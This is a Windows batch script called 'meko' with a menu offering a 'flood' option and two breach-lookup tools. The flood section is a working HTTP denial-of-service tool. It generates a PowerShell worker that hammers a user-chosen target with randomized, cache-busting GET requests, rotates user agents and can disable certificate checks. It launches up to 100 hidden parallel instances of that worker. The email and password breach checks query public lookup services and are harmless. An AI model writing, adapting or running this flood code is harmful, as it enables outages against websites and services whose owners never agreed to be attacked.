@echo off
setlocal EnableDelayedExpansion
title meko
mode con: cols=80 lines=35
color 0D

:menu
cls
echo.
echo   meko
echo.
echo   [1]  flood
echo   [2]  email breach
echo   [3]  password breach
echo   [4]  exit
echo.
set /p pick=  ^> 
if "%pick%"=="1" goto flood
if "%pick%"=="2" goto emailBreach
if "%pick%"=="3" goto passBreach
if "%pick%"=="4" exit /b 0
goto menu


:flood
cls
echo.
echo   flood
echo.
set /p target=  target  ^> 
if "%target%"=="" goto menu

echo %target% | findstr /b /c:"http://" /c:"https://" >nul
if errorlevel 1 set target=https://%target%

set /p seconds=  seconds (60)  ^> 
if "%seconds%"=="" set seconds=60

set /p workers=  workers (100)  ^> 
if "%workers%"=="" set workers=100

set /p badssl=  ignore bad ssl? y/n (y)  ^> 
if "%badssl%"=="" set badssl=y

echo.
echo   target   %target%
echo   seconds  %seconds%
echo   workers  %workers%
echo   badssl   %badssl%
echo.
set /p confirm=  fire? y/n  ^> 
if /i not "%confirm%"=="y" goto menu

set workerFile=%TEMP%\meko_flood.ps1
> "%workerFile%" echo param([string]$target,[int]$seconds,[string]$badssl)
>>"%workerFile%" echo $paths=@("/","/login","/admin","/setup.cgi","/cgi-bin/luci","/index.html","/api","/status")
>>"%workerFile%" echo $uas=@("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/126.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15")
>>"%workerFile%" echo if ($badssl -eq "y") { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } }
>>"%workerFile%" echo $handler=[System.Net.Http.SocketsHttpHandler]::new()
>>"%workerFile%" echo $handler.MaxConnectionsPerServer=64
>>"%workerFile%" echo $client=[System.Net.Http.HttpClient]::new($handler)
>>"%workerFile%" echo $client.Timeout=[TimeSpan]::FromSeconds(4)
>>"%workerFile%" echo $rng=[Random]::new()
>>"%workerFile%" echo $end=(Get-Date).AddSeconds($seconds)
>>"%workerFile%" echo $ok=0
>>"%workerFile%" echo $err=0
>>"%workerFile%" echo while ((Get-Date) -lt $end) {
>>"%workerFile%" echo   $url=$target.TrimEnd("/") + $paths[$rng.Next($paths.Length)] + "?_=" + $rng.Next(0,1073741824)
>>"%workerFile%" echo   $req=[System.Net.Http.HttpRequestMessage]::new("GET",$url)
>>"%workerFile%" echo   $req.Headers.TryAddWithoutValidation("User-Agent",$uas[$rng.Next($uas.Length)]) ^| Out-Null
>>"%workerFile%" echo   $req.Headers.TryAddWithoutValidation("Accept","*/*") ^| Out-Null
>>"%workerFile%" echo   try {
>>"%workerFile%" echo     $res=$client.Send($req,[System.Net.Http.HttpCompletionOption]::ResponseHeadersRead)
>>"%workerFile%" echo     $null=$res.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
>>"%workerFile%" echo     $res.Dispose()
>>"%workerFile%" echo     $ok++
>>"%workerFile%" echo   } catch { $err++ }
>>"%workerFile%" echo }
>>"%workerFile%" echo $client.Dispose()
>>"%workerFile%" echo Write-Host "done ok=$ok err=$err"

echo.
echo   launching %workers% workers for %seconds%s...
echo.

for /L %%i in (1,1,%workers%) do (
    start "meko-%%i" /MIN powershell -NoProfile -ExecutionPolicy Bypass -File "%workerFile%" -target "%target%" -seconds %seconds% -badssl "%badssl%"
)

timeout /t %seconds% /nobreak >nul

taskkill /FI "WINDOWTITLE eq meko-*" /F >nul 2>&1
del "%workerFile%" >nul 2>&1

echo   done.
echo.
pause
goto menu


:emailBreach
cls
echo.
echo   email breach
echo.
set /p email=  email  ^> 
if "%email%"=="" goto menu

set breachFile=%TEMP%\meko_email.ps1
> "%breachFile%" echo param([string]$email)
>>"%breachFile%" echo $url="https://api.xposedornot.com/v1/breach-analytics?email=" + [uri]::EscapeDataString($email)
>>"%breachFile%" echo try {
>>"%breachFile%" echo   $res=Invoke-RestMethod -Uri $url -Method GET -ErrorAction Stop
>>"%breachFile%" echo   if ($res.BreachesSummary -and $res.BreachesSummary.site) {
>>"%breachFile%" echo     $sites=$res.BreachesSummary.site -split ";"
>>"%breachFile%" echo     Write-Host ""
>>"%breachFile%" echo     Write-Host ("  " + $email + " found in " + $sites.Count + " breach(es):") -ForegroundColor Magenta
>>"%breachFile%" echo     Write-Host ""
>>"%breachFile%" echo     foreach ($entry in $res.ExposedBreaches.breaches_details) {
>>"%breachFile%" echo       Write-Host ("  " + $entry.breach) -ForegroundColor Yellow
>>"%breachFile%" echo       Write-Host ("     domain  : " + $entry.domain) -ForegroundColor Gray
>>"%breachFile%" echo       Write-Host ("     date    : " + $entry.xposed_date) -ForegroundColor Gray
>>"%breachFile%" echo       Write-Host ("     records : " + $entry.xposed_records) -ForegroundColor Gray
>>"%breachFile%" echo       Write-Host ("     data    : " + $entry.xposed_data) -ForegroundColor Gray
>>"%breachFile%" echo       Write-Host ""
>>"%breachFile%" echo     }
>>"%breachFile%" echo   } else {
>>"%breachFile%" echo     Write-Host ""
>>"%breachFile%" echo     Write-Host ("  " + $email + " not found in any known breach.") -ForegroundColor Green
>>"%breachFile%" echo   }
>>"%breachFile%" echo } catch {
>>"%breachFile%" echo   $code=0
>>"%breachFile%" echo   try { $code=[int]$_.Exception.Response.StatusCode } catch {}
>>"%breachFile%" echo   if ($code -eq 404) {
>>"%breachFile%" echo     Write-Host ""
>>"%breachFile%" echo     Write-Host ("  " + $email + " not found in any known breach.") -ForegroundColor Green
>>"%breachFile%" echo   } else {
>>"%breachFile%" echo     Write-Host ("  error: " + $_.Exception.Message) -ForegroundColor Red
>>"%breachFile%" echo   }
>>"%breachFile%" echo }

echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%breachFile%" -email "%email%"
del "%breachFile%" >nul 2>&1
echo.
pause
goto menu


:passBreach
cls
echo.
echo   password breach
echo.
set /p password=  password  ^> 
if "%password%"=="" goto menu

set passFile=%TEMP%\meko_pass.ps1
> "%passFile%" echo param([string]$password)
>>"%passFile%" echo $sha=[System.Security.Cryptography.SHA1]::Create()
>>"%passFile%" echo $bytes=[System.Text.Encoding]::UTF8.GetBytes($password)
>>"%passFile%" echo $hash=($sha.ComputeHash($bytes) ^| ForEach-Object { $_.ToString("X2") }) -join ""
>>"%passFile%" echo $prefix=$hash.Substring(0,5)
>>"%passFile%" echo $suffix=$hash.Substring(5)
>>"%passFile%" echo $url="https://api.pwnedpasswords.com/range/" + $prefix
>>"%passFile%" echo try {
>>"%passFile%" echo   $res=Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
>>"%passFile%" echo   $lines=$res.Content -split "`n"
>>"%passFile%" echo   $hit=$false
>>"%passFile%" echo   foreach ($line in $lines) {
>>"%passFile%" echo     $parts=$line -split ":"
>>"%passFile%" echo     if ($parts[0] -eq $suffix) {
>>"%passFile%" echo       Write-Host ("  found in breaches " + $parts[1].Trim() + " times.") -ForegroundColor Magenta
>>"%passFile%" echo       $hit=$true
>>"%passFile%" echo       break
>>"%passFile%" echo     }
>>"%passFile%" echo   }
>>"%passFile%" echo   if (-not $hit) { Write-Host "  not found." -ForegroundColor Green }
>>"%passFile%" echo } catch {
>>"%passFile%" echo   Write-Host ("  error: " + $_.Exception.Message) -ForegroundColor Red
>>"%passFile%" echo }

echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%passFile%" -password "%password%"
del "%passFile%" >nul 2>&1
echo.
pause
goto menu
